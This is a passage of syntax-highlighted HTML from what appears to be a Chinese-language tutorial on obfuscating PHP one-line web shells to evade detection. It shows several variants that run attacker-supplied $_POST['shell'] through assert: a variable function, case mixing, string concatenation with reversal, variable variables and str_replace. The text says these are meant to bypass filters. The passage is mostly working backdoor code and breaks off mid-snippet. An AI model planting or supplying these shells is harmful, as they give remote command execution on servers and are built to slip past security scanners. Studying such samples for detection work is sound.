&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;test&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;assert&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;test&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;有时需要使用大小写混淆、字符串拼接、字符串逆序等变化达到绕过&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;TR&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-string z-php&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;Es&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-string z-php&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;sA&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-string z-php&quot;&gt;strtolower&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;c&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-string z-php&quot;&gt;strrev&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;c&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ke-bian-bian-liang&quot;&gt;可变变量&lt;a class=&quot;zola-anchor&quot; href=&quot;#ke-bian-bian-liang&quot; aria-label=&quot;Anchor link for: ke-bian-bian-liang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;eval不可用，与可变函数同理&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;bb&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;assert&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;bb&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;a&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;$$a = ${$a} = ${&amp;#39;bb&amp;#39;} = $bb = &amp;quot;assert&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;str-replace-han-shu&quot;&gt;&lt;code&gt;str_replace&lt;&#x2F;code&gt; 函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#str-replace-han-shu&quot; aria-label=&quot;Anchor link for: str-replace-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-string z-php&quot;&gt;str_replace&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;Hell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-php&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted 